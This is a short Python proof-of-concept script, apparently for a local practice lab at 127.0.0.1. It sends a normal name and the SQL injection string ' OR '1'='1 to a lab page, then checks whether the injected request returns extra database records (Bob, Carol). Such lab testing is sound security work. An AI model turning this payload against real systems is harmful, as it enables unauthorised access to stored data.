#!/usr/bin/env python3
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
TIMEOUT = 10

def fetch(name):
    url = BASE_URL + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body

def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1"

    normal_status, normal_body = fetch(normal_name)
    test_status, test_body = fetch(test_name)

    print(f"普通输入 HTTP 状态: {normal_status}")
    print(f"普通输入包含 Alice: {'Alice' in normal_body}")
    print(f"普通输入包含 Bob: {'Bob' in normal_body}")
    print(f"普通输入包含 Carol: {'Carol' in normal_body}")

    print(f"测试输入 HTTP 状态: {test_status}")
    print(f"测试输入包含 Alice: {'Alice' in test_body}")
    print(f"测试输入包含 Bob: {'Bob' in test_body}")
    print(f"测试输入包含 Carol: {'Carol' in test_body}")

    normal_expected = ("Alice" in normal_body) and ("Bob" not in normal_body) and ("Carol" not in normal_body)
    test_expected = ("Bob" in test_body) and ("Carol" in test_body)

    print(f"普通输入预期记录集: {normal_expected}")
    print(f"测试输入预期记录集变化: {test_expected}")

    if normal_expected and test_expected:
        print("观察结果：普通输入仅命中 Alice，测试输入返回 Bob/Carol，记录集发生条件变化。")
    else:
        print("未观察到预期记录集变化。请检查服务、路径、数据库连接、lab_people 预置数据及错误日志。")

if __name__ == "__main__":
    main()
